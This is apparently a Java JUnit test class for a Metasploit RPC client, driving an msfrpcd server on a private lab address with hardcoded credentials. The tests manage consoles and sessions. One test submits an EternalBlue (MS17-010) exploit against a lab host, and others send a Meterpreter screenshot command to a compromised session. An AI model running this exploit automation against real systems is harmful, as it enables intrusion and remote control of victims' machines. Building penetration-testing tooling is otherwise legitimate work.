package com.zz.msfRpc;


import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

import com.zz.msfRpc.entity.Console;
import com.zz.msfRpc.entity.Session;
import com.zz.msfRpc.msf.client.MsfRpcClient;
import com.zz.msfRpc.msf.util.MsfRpcUtils;
import lombok.extern.slf4j.Slf4j;
import org.junit.Test;


import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

@Slf4j
public class MsfTest {
    private  ConcurrentHashMap<String, List<Console>> ConsolesMap = new ConcurrentHashMap<>();

    private  static  final  String CONSOLE = "console";

    private  ConcurrentHashMap<String, Session> sessionsMap = new ConcurrentHashMap<>();
//    private
    /**
     * 登录认证
     *
     * @param
     */
    @Test
    public void start() {
        MsfRpcClient client = new MsfRpcClient("192.168.60.129", 55553, "msf", "msf");
    }

    /**
     * 指令
     */
    @Test
    public void sendCommend() {
        MsfRpcClient client = new MsfRpcClient("192.168.60.129", 55553, "msf", "msf");
        Map<String, Object> response = client.createConsole();
        log.info("Console 创建成功"+response);
    }
    /**
     * 获取会话
     */
    @Test
    public void sessionList() {
        MsfRpcClient client = new MsfRpcClient("192.168.60.129", 55553, "msf", "msf");
        Map<String, Object> response = client.listSessions();
        ObjectMapper objectMapper = new ObjectMapper();
        for (Map.Entry<String, Object> entry : response.entrySet()) {
            // 将 Object 转换为 JSON 字符串
            String jsonString = (String) entry.getValue();
            // 反序列化 JSON 字符串为 Session 对象
            try {
                 // 将会话存入新的 Map 如果已经存在就不需要在进行存放了
                if (!sessionsMap.contains(entry.getKey())){
                    Session session = objectMapper.readValue(jsonString, Session.class);
                    sessionsMap.put(entry.getKey(), session);
                }
            } catch (JsonProcessingException e) {
                throw new RuntimeException(e);
            }
        }
        for (String id: sessionsMap.keySet()){
            System.out.println(id);
        }
        log.info("Sessions的数量="+sessionsMap.entrySet().size());
    }


    /**
     * 获取一个当前的终端
     */
    @Test
    public void listConsoles() {
        MsfRpcClient client = new MsfRpcClient("192.168.60.129", 55553, "msf", "msf");
        Map<String, Object> result = client.listConsoles();
        ObjectMapper objectMapper =new ObjectMapper();
        try {
            // 将 Map<String, Object> 转换为 JSON 字符串
            String json = objectMapper.writeValueAsString(result);
            // 将 JSON 字符串解析为 Map<String, Object>
            Map<String, Object> parsedMap = objectMapper.readValue(json, Map.class);
            // 获取 "consoles" 列表
            String consolesJson = (String) parsedMap.get("consoles");

            // 将 consoles 的 JSON 字符串解析为 List<Consoles>
            List<Console> consolesList = objectMapper.readValue(
                    consolesJson,
                    objectMapper.getTypeFactory().constructCollectionType(List.class,Console.class)
            );
            ConsolesMap.put(CONSOLE,consolesList);
            log.info("终端控制器"+ConsolesMap);

        } catch (JsonProcessingException e) {
            throw new RuntimeException(e);
        }
        if (!ConsolesMap.isEmpty()){
            log.info("Consoles"+ConsolesMap);
        }

    }

    @Test
    public void writeConsoles() {

        MsfRpcClient client = new MsfRpcClient("192.168.60.129", 55553, "msf", "msf");
        Map<String, Object> stringObjectMap = client.listConsoles();
        System.out.println("Console sum: " + stringObjectMap);
        List<Integer> consoleIdsList = MsfRpcUtils.getConsoleIdFromResponse(stringObjectMap);
        //默认获取最后一个
        Integer consoleId = consoleIdsList.get(consoleIdsList.size()-1);
        String command = "help";
        Map<String, Object> writeResponse = client.writeConsole(consoleId, command, true);
        System.out.println("Write response: " + writeResponse);

    }

    /**
     * 读结果
     */
    @Test
    public void readConsoles() {
        MsfRpcClient client = new MsfRpcClient("192.168.60.129", 55553, "msf", "msf");
        Map<String, Object> stringObjectMap = client.listConsoles();
        System.out.println("Console sum: " + stringObjectMap);
        List<Integer> consoleIdsList = MsfRpcUtils.getConsoleIdFromResponse(stringObjectMap);
        //默认获取最后一个
        Integer id = consoleIdsList.get(consoleIdsList.size()-1);
        Map<String, Object> stringObjectMap1 = client.readConsole(id);
        System.out.println("read" + stringObjectMap1);
    }

    /**
     * 加入攻击模块
     */
    @Test
    public void model() {
        String cmd2 = """
                use exploit/windows/smb/ms17_010_eternalblue
                set payload
                show options
                set rhosts 192.168.60.146
                exploit
                """;
        MsfRpcClient client = new MsfRpcClient("192.168.60.129", 55553, "msf", "msf");
        client.createConsole();
        Map<String, Object> stringObjectMap = client.listConsoles();
        List<Integer> consoleIdsList = MsfRpcUtils.getConsoleIdFromResponse(stringObjectMap);
        //默认获取最后一个
        Integer id = consoleIdsList.get(consoleIdsList.size()-1);
        //执行攻击模块
        client.writeConsole(id, cmd2, true);
        Map<String, Object> result = client.listSessions();
        System.out.println("Console sessionSum: " + result);
        }

        @Test
        public void readSession(){
            MsfRpcClient client = new MsfRpcClient("192.168.60.129", 55553, "msf", "msf");
            Map<String, Object> stringObjectMap = client.listConsoles();
            List<Integer> consoleIdsList = MsfRpcUtils.getConsoleIdFromResponse(stringObjectMap);
            //默认获取最后一个
            Integer id = consoleIdsList.get(consoleIdsList.size()-1);
            log.info("当前的终端id为"+id);
            // 等待一段时间让命令执行
            //todo 做一个定时任务 当开启读取session的使用 根据输出的结果做一个判断是继续执行还是 退出
            StringBuffer outputBuilder = new StringBuffer();
            AtomicBoolean isBusy = new AtomicBoolean(true);
            AtomicBoolean isDataEmpty = new AtomicBoolean(false);
            ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
            Runnable checkStatus = () -> {
                Map<String, Object> res = client.readConsole(id);
                Object busy = res.get("busy");
                String data = (String) res.get("data");
                if (busy != null) {
                    if (busy.equals("true")) {
                        outputBuilder.append(data);
                        System.out.println(data);
                        if (data.isEmpty()) {
                            isDataEmpty.set(true);
                        }
                    } else if (busy.equals("false")) {
                        outputBuilder.append(data);
                        System.out.println("没有会话session"+data);
                        isBusy.set(false);
                    }
                } else {
                    // Handle unexpected response
                    System.err.println("Unexpected response: " + res);
                    isBusy.set(false);
                }

                // 如果命令执行完成或 data 为空，取消定时任务
                if (!isBusy.get() || isDataEmpty.get()) {
                    scheduler.shutdown();
                }
            };
            // 每隔1秒检查一次命令执行状态
            scheduler.scheduleAtFixedRate(checkStatus, 0, 2, TimeUnit.SECONDS);

            // 等待定时任务完成
            try {
                scheduler.awaitTermination(Long.MAX_VALUE, TimeUnit.NANOSECONDS);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            // 输出最终结果
            String finalOutput = outputBuilder.toString();
            if (finalOutput ==null){

            }
            System.out.println("Final Output: " + finalOutput);
        }
    @Test
    public void destroyConsole(){
        MsfRpcClient client = new MsfRpcClient("192.168.60.129", 55553, "msf", "msf");
        Map<String, Object> result = client.listConsoles();
        List<Integer> consoleIdsList = MsfRpcUtils.getConsoleIdFromResponse(result);
        //默认获取最后一个
        System.out.println("Console sum: " + consoleIdsList);
        for (Integer id : consoleIdsList){
            client.destroyConsole(id);
        }
        Map<String, Object> flag = client.listConsoles();
        if (flag==null){
            System.out.println("删除控制台");
        }
        System.out.println(flag);
    }

    @Test
    public void stopSession(){
    MsfRpcClient client = new MsfRpcClient("192.168.60.129", 55553, "msf", "msf");
    //获取会话id
        Map<String, Object> response = client.listSessions();
        ObjectMapper objectMapper = new ObjectMapper();
        for (Map.Entry<String, Object> entry : response.entrySet()) {
            // 将 Object 转换为 JSON 字符串
            String jsonString = (String) entry.getValue();
            // 反序列化 JSON 字符串为 Session 对象
            try {
                // 将会话存入新的 Map 如果已经存在就不需要在进行存放了
                if (!sessionsMap.contains(entry.getKey())){
                    Session session = objectMapper.readValue(jsonString, Session.class);
                    sessionsMap.put(entry.getKey(), session);
                }
            } catch (JsonProcessingException e) {
                throw new RuntimeException(e);
            }
        }

        for (String  id : sessionsMap.keySet()){
            client.stopSession(Integer.parseInt(id));
        }
     Map<String, Object> flag = client.listConsoles();
        if (flag==null){
            System.out.println("停止所有会话");
        }

    }
    @Test
    public void meterpreterWrite(){
        MsfRpcClient client = new MsfRpcClient("192.168.60.129", 55553, "msf", "msf");
        //获取会话id
        Map<String, Object> response = client.listSessions();
        ObjectMapper objectMapper = new ObjectMapper();
        for (Map.Entry<String, Object> entry : response.entrySet()) {
            // 将 Object 转换为 JSON 字符串
            String jsonString = (String) entry.getValue();
            // 反序列化 JSON 字符串为 Session 对象
            try {
                // 将会话存入新的 Map 如果已经存在就不需要在进行存放了
                if (!sessionsMap.contains(entry.getKey())){
                   Session session = objectMapper.readValue(jsonString, Session.class);
                    sessionsMap.put(entry.getKey(), session);
                }
            } catch (JsonProcessingException e) {
                throw new RuntimeException(e);
            }
        }
        String cmd="""
            screenshot
             """;
        Map<String, Object> result = client.writeMeterpreter(16, cmd);
        log.info("向meterpreter发送命令"+result);

    }
    @Test
    public void meterpreterRead(){
        MsfRpcClient client = new MsfRpcClient("192.168.60.129", 55553, "msf", "msf");
        Map<String, Object> stringObjectMap = client.readMeterpreter(16);
        System.out.println(stringObjectMap);
    }

}




